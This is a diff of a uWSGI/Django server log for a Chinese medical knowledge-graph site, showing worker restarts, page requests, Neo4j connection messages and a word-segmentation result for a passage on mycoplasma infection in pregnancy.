-[pid: 28886|app: 0|req: 5/7] 112.10.182.10 () {46 vars in 965 bytes} [Sun Mar 17 07:54:57 2019] GET /views/interlocution/?id=1 => generated 4233 bytes in 6 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
-[pid: 28886|app: 0|req: 6/8] 112.10.182.10 () {46 vars in 868 bytes} [Sun Mar 17 07:55:42 2019] GET / => generated 11772 bytes in 35 msecs (HTTP/1.1 200) 4 headers in 196 bytes (1 switches on core 0)
-[pid: 28886|app: 0|req: 7/9] 112.10.182.10 () {44 vars in 804 bytes} [Sun Mar 17 07:55:42 2019] GET /views/console => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
-Sun Mar 17 07:55:43 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 28883)...
-Gracefully killing worker 2 (pid: 28884)...
-Gracefully killing worker 3 (pid: 28885)...
-Gracefully killing worker 4 (pid: 28886)...
-165====5
-{'title': '治疗口腔溃疡的饮食小偏方', 'abstract': '俗话说：伤筋动骨一白天。那么骨折后吃什么好的快？这都是骨折患者想知道的问题。', 'url': 'https://ys.99.com.cn/diaoyang/466535.htm'}
-[pid: 28886|app: 0|req: 8/10] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 07:55:42 2019] GET /views/console/ => generated 13309 bytes in 571 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 07:55:44 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0xd041f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xd041f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 2323, cores: 2)
-spawned uWSGI worker 2 (pid: 2324, cores: 2)
-spawned uWSGI worker 3 (pid: 2325, cores: 2)
-spawned uWSGI worker 4 (pid: 2326, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 2323|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 816 bytes} [Sun Mar 17 07:55:45 2019] GET /views/interlocution => generated 0 bytes in 924 msecs (HTTP/1.1 301) 3 headers in 126 bytes (1 switches on core 0)
-[pid: 2323|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 818 bytes} [Sun Mar 17 07:55:46 2019] GET /views/interlocution/ => generated 4135 bytes in 12 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-[pid: 2323|app: 0|req: 3/3] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 07:56:00 2019] GET /accounts/login => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 0)
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 2324|app: 0|req: 1/4] 112.10.182.10 () {44 vars in 808 bytes} [Sun Mar 17 07:56:00 2019] GET /accounts/login/ => generated 5358 bytes in 786 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
-Not Found: /favicon.ico
-[pid: 2324|app: 0|req: 2/5] 112.10.182.10 () {38 vars in 562 bytes} [Sun Mar 17 07:56:01 2019] GET /favicon.ico => generated 6826 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
-[pid: 2324|app: 0|req: 3/6] 112.10.182.10 () {50 vars in 1043 bytes} [Sun Mar 17 07:56:08 2019] POST /accounts/login/ => generated 0 bytes in 219 msecs (HTTP/1.1 302) 8 headers in 569 bytes (1 switches on core 1)
-[pid: 2323|app: 0|req: 4/7] 112.10.182.10 () {46 vars in 913 bytes} [Sun Mar 17 07:56:08 2019] GET / => generated 12444 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 2323|app: 0|req: 5/8] 112.10.182.10 () {44 vars in 893 bytes} [Sun Mar 17 07:56:08 2019] GET /views/console => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
-Sun Mar 17 07:56:08 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 2323)...
-Gracefully killing worker 2 (pid: 2324)...
-Gracefully killing worker 3 (pid: 2325)...
-Gracefully killing worker 4 (pid: 2326)...
-96====7
-{'title': '哎呀，走丢了', 'abstract': '', 'url': 'javascript:void(0);'}
-[pid: 2323|app: 0|req: 6/9] 112.10.182.10 () {44 vars in 895 bytes} [Sun Mar 17 07:56:08 2019] GET /views/console/ => generated 13138 bytes in 449 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-binary reloading uWSGI...
-chdir() to /root/MHKG/Django
-closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
-found fd 3 mapped to socket 0 (127.0.0.1:8000)
-running /usr/local/bin/uwsgi
-[uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 07:56:09 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x15301f0
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x15301f0 pid: 19836 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19836)
-spawned uWSGI worker 1 (pid: 2410, cores: 2)
-spawned uWSGI worker 2 (pid: 2411, cores: 2)
-spawned uWSGI worker 3 (pid: 2412, cores: 2)
-spawned uWSGI worker 4 (pid: 2413, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 2410|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 914 bytes} [Sun Mar 17 07:56:10 2019] GET /views/interlocution?id=2 => generated 0 bytes in 750 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 0)
-[pid: 2410|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 916 bytes} [Sun Mar 17 07:56:11 2019] GET /views/interlocution/?id=2 => generated 4233 bytes in 20 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-[pid: 2410|app: 0|req: 3/3] 168.1.22.242 () {34 vars in 381 bytes} [Sun Mar 17 08:38:39 2019] GET / => generated 11772 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-goodbye to uWSGI.
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:03:18 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-writing pidfile to logs/uwsgi.pid
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0xab8920
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0xab8920 pid: 8090 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 8090)
-spawned uWSGI worker 1 (pid: 8092, cores: 2)
-spawned uWSGI worker 2 (pid: 8093, cores: 2)
-spawned uWSGI worker 3 (pid: 8094, cores: 2)
-spawned uWSGI worker 4 (pid: 8095, cores: 2)
-Python auto-reloader enabled
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-goodbye to uWSGI.
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:06:47 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-writing pidfile to logs/uwsgi.pid
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x1644910
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1644910 pid: 8428 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 8428)
-spawned uWSGI worker 1 (pid: 8431, cores: 2)
-spawned uWSGI worker 2 (pid: 8432, cores: 2)
-spawned uWSGI worker 3 (pid: 8433, cores: 2)
-spawned uWSGI worker 4 (pid: 8434, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 8431|app: 0|req: 1/1] 80.247.241.6 () {32 vars in 458 bytes} [Sun Mar 17 09:10:36 2019] GET / => generated 11772 bytes in 962 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-[pid: 8431|app: 0|req: 2/2] 189.47.22.62 () {32 vars in 452 bytes} [Sun Mar 17 09:11:41 2019] GET / => generated 11772 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 8431|app: 0|req: 3/3] 217.29.98.81 () {28 vars in 288 bytes} [Sun Mar 17 09:23:05 2019] GET / => generated 11772 bytes in 2 msecs (HTTP/1.0 200) 4 headers in 125 bytes (1 switches on core 1)
-[pid: 8431|app: 0|req: 4/4] 201.150.151.122 () {32 vars in 461 bytes} [Sun Mar 17 09:51:16 2019] GET / => generated 11772 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
-SIGINT/SIGQUIT received...killing workers...
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:51:48 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-writing pidfile to logs/uwsgi.pid
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-probably another instance of uWSGI is running on the same address (127.0.0.1:8000).
-bind(): Address already in use [core/socket.c line 769]
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
+集合不存在
+集合不存在
+[pid: 26530|app: 0|req: 1/9] 120.199.34.100 () {44 vars in 947 bytes} [Thu Mar 21 02:28:13 2019] GET /admin_views/general/ => generated 4636 bytes in 1405 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
 worker 1 buried after 2 seconds
-goodbye to uWSGI.
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:54:20 2019] ***
-compiled with version: 8.3.0 on 16 March 2019 06:35:56
-os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
-nodename: VM_0_13_centos
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 1
-current working directory: /root/MHKG/Django
-writing pidfile to logs/uwsgi.pid
-detected binary path: /usr/local/bin/uwsgi
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-chdir() to /root/MHKG/Django
-your processes number limit is 7272
-your memory page size is 4096 bytes
-detected max file descriptor number: 100001
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0xdf5920
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-python threads support enabled
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 416880 bytes (407 KB) for 8 cores
-*** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0xdf5920 pid: 13004 (default app)
-uWSGI running as root, you can use --uid/--gid/--chroot options
-*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 13004)
-spawned uWSGI worker 1 (pid: 13008, cores: 2)
-spawned uWSGI worker 2 (pid: 13009, cores: 2)
-spawned uWSGI worker 3 (pid: 13010, cores: 2)
-spawned uWSGI worker 4 (pid: 13011, cores: 2)
-Python auto-reloader enabled
-数据库已存在！
-create neo4j class ...
-connect succeed
-数据库已存在！
-[pid: 13009|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 853 bytes} [Sun Mar 17 09:54:45 2019] GET / => generated 11772 bytes in 824 msecs (HTTP/1.1 200) 4 headers in 196 bytes (1 switches on core 0)
-202====0
-{'title': '脸色发黄吃什么好', 'abstract': '聪明的女人就要学会利用饮食的方法，把色斑明显，肤色暗淡的问题通通都吃干净，下面为大家推荐十种可以把各种皮肤问题吃光光的美食。', 'url': 'https://ys.99.com.cn/diaoyang/510608.htm'}
-[pid: 13009|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 844 bytes} [Sun Mar 17 09:54:46 2019] GET /views/console/ => generated 13357 bytes in 403 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-Sun Mar 17 09:54:47 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
-...gracefully killing workers...
-Gracefully killing worker 1 (pid: 13008)...
-Gracefully killing worker 2 (pid: 13009)...
-Gracefully killing worker 3 (pid: 13010)...
-Gracefully killing worker 4 (pid: 13011)...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
+worker 2 buried after 2 seconds
+worker 3 buried after 2 seconds
+worker 4 buried after 2 seconds
 binary reloading uWSGI...
 chdir() to /root/MHKG/Django
 closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
 found fd 3 mapped to socket 0 (127.0.0.1:8000)
 running /usr/local/bin/uwsgi
 [uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 09:54:48 2019] ***
+*** Starting uWSGI 2.0.18 (64bit) on [Thu Mar 21 02:28:16 2019] ***
 compiled with version: 8.3.0 on 16 March 2019 06:35:56
 os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
 nodename: VM_0_13_centos
@@ -1290,7 +446,7 @@ uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x1843250
+Python main interpreter initialized at 0x277d240
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 python threads support enabled
@@ -1298,49 +454,49 @@ your server socket listen backlog is limited to 100 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 416880 bytes (407 KB) for 8 cores
 *** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1843250 pid: 13004 (default app)
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x277d240 pid: 976 (default app)
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 *** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 13004)
-spawned uWSGI worker 1 (pid: 13087, cores: 2)
-spawned uWSGI worker 2 (pid: 13088, cores: 2)
-spawned uWSGI worker 3 (pid: 13089, cores: 2)
-spawned uWSGI worker 4 (pid: 13090, cores: 2)
+gracefully (RE)spawned uWSGI master process (pid: 976)
+spawned uWSGI worker 1 (pid: 26646, cores: 2)
+spawned uWSGI worker 2 (pid: 26647, cores: 2)
+spawned uWSGI worker 3 (pid: 26648, cores: 2)
+spawned uWSGI worker 4 (pid: 26649, cores: 2)
 Python auto-reloader enabled
 数据库已存在！
 create neo4j class ...
 connect succeed
 数据库已存在！
-[pid: 13087|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 844 bytes} [Sun Mar 17 09:54:50 2019] GET /views/consoles => generated 0 bytes in 836 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 0)
-[pid: 13087|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 846 bytes} [Sun Mar 17 09:54:51 2019] GET /views/consoles/ => generated 7694 bytes in 2771 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
-[pid: 13087|app: 0|req: 3/3] 112.10.182.10 () {44 vars in 850 bytes} [Sun Mar 17 09:55:01 2019] GET /views/distinguish => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 124 bytes (1 switches on core 0)
+[pid: 26646|app: 0|req: 1/1] 120.199.34.100 () {44 vars in 921 bytes} [Thu Mar 21 02:28:17 2019] GET /admin_views/general/getCpuAndMemory/ => generated 30 bytes in 839 msecs (HTTP/1.1 200) 3 headers in 114 bytes (1 switches on core 0)
+[pid: 26646|app: 0|req: 2/2] 120.199.34.100 () {44 vars in 921 bytes} [Thu Mar 21 02:28:18 2019] GET /admin_views/general/getCpuAndMemory/ => generated 28 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 114 bytes (1 switches on core 1)
+[pid: 26646|app: 0|req: 3/3] 120.199.34.100 () {44 vars in 921 bytes} [Thu Mar 21 02:28:19 2019] GET /admin_views/general/getCpuAndMemory/ => generated 28 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 114 bytes (1 switches on core 1)
+[pid: 26646|app: 0|req: 4/4] 120.199.34.100 () {44 vars in 921 bytes} [Thu Mar 21 02:28:20 2019] GET /admin_views/general/getCpuAndMemory/ => generated 28 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 114 bytes (1 switches on core 1)
+[pid: 26646|app: 0|req: 5/5] 120.199.34.100 () {44 vars in 921 bytes} [Thu Mar 21 02:28:21 2019] GET /admin_views/general/getCpuAndMemory/ => generated 28 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 114 bytes (1 switches on core 1)
 数据库已存在！
 create neo4j class ...
+[pid: 26646|app: 0|req: 6/6] 120.199.34.100 () {44 vars in 921 bytes} [Thu Mar 21 02:28:22 2019] GET /admin_views/general/getCpuAndMemory/ => generated 29 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 114 bytes (1 switches on core 1)
 connect succeed
 数据库已存在！
-[pid: 13090|app: 0|req: 1/4] 112.10.182.10 () {44 vars in 852 bytes} [Sun Mar 17 09:55:01 2019] GET /views/distinguish/ => generated 4075 bytes in 948 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
-/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:39: CryptographyDeprecationWarning: encode_point has been deprecated on EllipticCurvePublicNumbers and will be removed in a future version. Please use EllipticCurvePublicKey.public_bytes to obtain both compressed and uncompressed point encoding.
-  m.add_string(self.Q_C.public_numbers().encode_point())
-/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:96: CryptographyDeprecationWarning: Support for unsafe construction of public numbers from encoded data will be removed in a future version. Please use EllipticCurvePublicKey.from_encoded_point
-  self.curve, Q_S_bytes
-/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:111: CryptographyDeprecationWarning: encode_point has been deprecated on EllipticCurvePublicNumbers and will be removed in a future version. Please use EllipticCurvePublicKey.public_bytes to obtain both compressed and uncompressed point encoding.
-  hm.add_string(self.Q_C.public_numbers().encode_point())
-------start------
-[connect success] | ip : 39.108.111.94
-result:
-Model loaded succeed [['妊娠', 'v'], ['期支', 'n'], ['原体', 'n'], ['感染', 'v'], ['可', 'v'], ['导致', 'v'], ['晚期', 't'], ['流产', 'v'], ['、', 'w'], ['早产', 'v'], ['或', 'c'], ['死产', 'v'], ['等', 'u'], ['严重', 'a'], ['并发症', 'n'], ['。', 'w'], ['支原体', 'n'], ['是', 'v'], ['居细菌', 'n'], ['和', 'c'], ['病毒', 'n'], ['之间', 'f'], ['无', 'v'], ['细胞壁', 'n'], ['，', 'w'], ['能', 'v'], ['独立', 'a'], ['生存', 'v'], ['的', 'u'], ['最', 'd'], ['小', 'a'], ['微生物', 'n'], ['。', 'w'], ['感染', 'v'], ['人类', 'n'], ['的', 'u'], ['支原体', 'n'], ['约', 'd'], ['12一14', 'm'], ['种', 'q'], ['，', 'w'], ['其中', 'r'], ['以', 'p'], ['女性', 'n'], ['生殖道', 'n'], ['分离', 'v'], ['出人型支', 'id'], ['原体', 'n'], ['及', 'c'], ['解脲', 'v'], ['支原体', 'n'], ['最为', 'd'], ['常见', 'a'], ['。', 'w'], ['MH', 'x'], ['感染', 'v'], ['多', 'a'], ['引起', 'v'], ['阴道炎', 'n'], ['、', 'w'], ['宫颈炎', 'n'], ['和', 'c'], ['输卵管炎', 'n'], ['，', 'w'], ['而', 'c'], ['UU', 'n'], ['则', 'd'], ['引起', 'v'], ['非淋菌性尿道炎', 'uw'], ['。', 'w'], ['支', 'q'], ['原体', 'n'], ['多', 'a'], ['与', 'c'], ['宿主', 'n'], ['共存', 'v'], ['，', 'w'], ['不', 'd'], ['表现', 'v'], ['出', 'v'], ['感染', 'v'], ['症状', 'n'], ['，', 'w'], ['仅', 'd'], ['在', 'p'], ['某些', 'r'], ['条件', 'n'], ['下', 'f'], ['可', 'd'], ['引起', 'v'], ['机会性', 'n'], ['感染', 'v'], ['，', 'w'], ['且', 'c'], ['常', 'd'], ['合并', 'v'], ['其他', 'r'], ['致病', 'v'], ['原', 'd'], ['共同', 'd'], ['致病', 'v'], ['。', 'w'], ['近', 'a'], ['来', 'v'], ['发现', 'v'], ['肺炎', 'n'], ['支原体', 'n'], ['(', 'w'], ['MP', 'x'], [')', 'w'], ['、', 'w'], ['生殖支', 'n'], ['原体', 'n'], ['(', 'w'], ['MG', 'x'], [')', 'w'], ['等', 'u'], ['亦可', 'v'], ['引起', 'v'], ['母儿', 'n'], ['感染', 'v'], ['。', 'w']]
-
-------end------
-[pid: 13090|app: 0|req: 2/5] 112.10.182.10 () {52 vars in 1099 bytes} [Sun Mar 17 09:55:05 2019] POST /views/distinguish/getDistinguishData/ => generated 7115 bytes in 18393 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 1)
-[pid: 13087|app: 0|req: 4/6] 112.10.182.10 () {44 vars in 856 bytes} [Sun Mar 17 09:55:26 2019] GET /views/interlocution/ => generated 4135 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
-SIGINT/SIGQUIT received...killing workers...
+[pid: 26647|app: 0|req: 1/7] 120.199.34.100 () {44 vars in 939 bytes} [Thu Mar 21 02:28:21 2019] GET /accounts/logout/ => generated 0 bytes in 1093 msecs (HTTP/1.1 302) 5 headers in 223 bytes (1 switches on core 0)
+[pid: 26646|app: 0|req: 7/8] 120.199.34.100 () {44 vars in 893 bytes} [Thu Mar 21 02:28:22 2019] GET /accounts/login/ => generated 5358 bytes in 21 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 1)
+Thu Mar 21 02:28:22 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 26646)...
